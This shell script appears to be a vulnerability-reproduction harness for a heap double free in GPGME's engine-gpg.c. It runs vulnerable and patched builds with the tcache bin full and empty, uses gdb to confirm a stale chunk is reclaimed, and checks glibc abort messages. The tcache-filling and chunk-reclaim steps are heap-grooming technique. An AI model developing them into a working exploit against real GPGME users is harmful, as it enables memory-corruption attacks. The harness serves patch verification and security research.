#!/bin/sh
# Tcache-capacity probe for the CVE-2026-129975 stale status-buffer free.
# No sanitizer, no network. A full 0x410 tcache bin moves the second free of
# the aliased chunk from tcache detection to unsorted-bin detection; plain
# glibc still aborts. The library's own strdup(rest) is the reclaimer.
set -u
cd "$(dirname "$0")" || exit 2
mkdir -p evidence
pass=0; fail=0
check() {
  if [ "$1" = "$2" ]; then pass=$((pass+1));
  else fail=$((fail+1)); echo "FAIL: $3 (got '$1', want '$2')"; fi
}
hash() { sha256sum "$1" | cut -d' ' -f1; }

check "$(hash ../pinned/engine-gpg.c)" c4ef11bda841fc6d07c83063c6968a6db50db3393af2d661054c59b979311d55 "pinned engine-gpg.c"
check "$(hash ../pinned/fix.patch)" 2fde658ab8b32439c14f58c214f2463b4109aa68d9cbd26c432f17303049c500 "pinned fix.patch"
check "$(hash gpgme-2.2.0/src/engine-gpg.c)" c4ef11bda841fc6d07c83063c6968a6db50db3393af2d661054c59b979311d55 "built vulnerable source"
check "$(hash gpgme-fixed/src/engine-gpg.c)" 10179f7853d9284a21af4ad4ab94753654aa40119f9bdef43852e98482b75b08 "built patched source"

TCACHE_FULL=1 ./status-tcache-full-plain-vuln ./fake-internal-gpg.py >evidence/tcachefull-vuln-full.out 2>&1
echo $? >evidence/tcachefull-vuln-full.rc
TCACHE_FULL=0 ./status-tcache-full-plain-vuln ./fake-internal-gpg.py >evidence/tcachefull-vuln-control.out 2>&1
echo $? >evidence/tcachefull-vuln-control.rc
TCACHE_FULL=1 ./status-tcache-full-plain-fixed ./fake-internal-gpg.py >evidence/tcachefull-fixed-full.out 2>&1
echo $? >evidence/tcachefull-fixed-full.rc
TCACHE_FULL=0 ./status-tcache-full-plain-fixed ./fake-internal-gpg.py >evidence/tcachefull-fixed-control.out 2>&1
echo $? >evidence/tcachefull-fixed-control.rc
TCACHE_FULL=1 SHORT=1 ./status-tcache-full-plain-vuln ./fake-internal-gpg.py >evidence/tcachefull-vuln-short.out 2>&1
echo $? >evidence/tcachefull-vuln-short.rc

cat >evidence/tcachefull-gdb.cmd <<'EOF'
set pagination off
break engine-gpg.c:1570
run ./fake-internal-gpg.py
printf "gdb fill0=%p status.buffer=%p cmd.keyword=%p equal=%d\n", fill[0], gpg->status.buffer, gpg->cmd.keyword, fill[0] == gpg->cmd.keyword
continue
quit
EOF
TCACHE_FULL=1 gdb -q -batch -x evidence/tcachefull-gdb.cmd ./status-tcache-full-plain-vuln \
  >evidence/tcachefull-gdb.out 2>&1
echo $? >evidence/tcachefull-gdb.rc

check "$(cat evidence/tcachefull-vuln-full.rc)" 134 "full-bin vulnerable build aborts"
check "$(grep -c 'mon_cb call=1 keyword=GET_LINE arglen=1020 byte\[1000\]=0x48' evidence/tcachefull-vuln-full.out)" 1 "chosen byte in realloc-forcing GET_LINE"
check "$(grep -c 'mon_cb call=2 keyword=GOOD arglen=600' evidence/tcachefull-vuln-full.out)" 1 "long GOOD triggers monitor error"
check "$(grep -c 'tcache_refill fill0=' evidence/tcachefull-vuln-full.out)" 1 "bin refill from callback"
check "$(grep -c 'tcache_full extra freed' evidence/tcachefull-vuln-full.out)" 1 "seven-entry bin before stale free"
check "$(grep -c 'double free or corruption (!prev)' evidence/tcachefull-vuln-full.out)" 1 "unsorted-bin double free detection"
check "$(grep -c 'double free detected in tcache' evidence/tcachefull-vuln-full.out)" 0 "no tcache double free when bin is full"
check "$(grep -c 'op2 keylist_start' evidence/tcachefull-vuln-full.out)" 0 "vulnerable op2 never starts"
check "$(grep -c 'gdb fill0=.*status.buffer=.*cmd.keyword=.*equal=1' evidence/tcachefull-gdb.out)" 1 "library strdup reclaimed stale chunk"

check "$(cat evidence/tcachefull-vuln-control.rc)" 134 "empty-bin vulnerable control aborts"
check "$(grep -c 'double free detected in tcache' evidence/tcachefull-vuln-control.out)" 1 "empty-bin control uses tcache detection"
check "$(grep -c 'double free or corruption (!prev)' evidence/tcachefull-vuln-control.out)" 0 "empty-bin control avoids unsorted detection"

check "$(cat evidence/tcachefull-fixed-full.rc)" 0 "patched full-bin build exits clean"
check "$(grep -c 'op2 keylist_start err=Success' evidence/tcachefull-fixed-full.out)" 1 "patched full-bin op2 starts"
check "$(grep -c 'release done' evidence/tcachefull-fixed-full.out)" 1 "patched full-bin release completes"
check "$(grep -cE 'double free|corruption \(!prev\)' evidence/tcachefull-fixed-full.out)" 0 "patched full-bin clean"

check "$(cat evidence/tcachefull-fixed-control.rc)" 0 "patched empty-bin build exits clean"
check "$(grep -c 'op2 keylist_start err=Success' evidence/tcachefull-fixed-control.out)" 1 "patched empty-bin op2 starts"
check "$(grep -cE 'double free|corruption \(!prev\)' evidence/tcachefull-fixed-control.out)" 0 "patched empty-bin clean"

check "$(cat evidence/tcachefull-vuln-short.rc)" 0 "short-line vulnerable control exits clean"
check "$(grep -c 'op2 keylist_start err=Success' evidence/tcachefull-vuln-short.out)" 1 "short-line op2 starts"
check "$(grep -cE 'double free|corruption \(!prev\)' evidence/tcachefull-vuln-short.out)" 0 "short-line control clean"

echo "PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ]
